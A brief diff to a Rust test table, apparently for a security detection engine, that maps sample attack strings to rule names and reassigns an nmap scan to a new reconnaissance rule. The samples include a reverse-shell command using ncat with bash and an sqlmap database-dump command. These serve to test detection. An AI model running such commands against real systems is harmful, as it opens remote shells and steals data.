@@ -2766,7 +2766,8 @@ mod tests {
                 "PHPWebshellObfuscated",
             ),
             ("ncat 10.0.0.5 4444 -e /bin/bash", "ReverseShell"),
-            ("nmap -sS 10.0.0.0/24", "OffensiveToolReferences"),
+            ("sqlmap --url http://x --dump", "OffensiveToolReferences"),
+            ("nmap -sS 10.0.0.0/24", "NetworkReconnaissance"),
         ];
 
         for (payload, expected_rule) in cases {
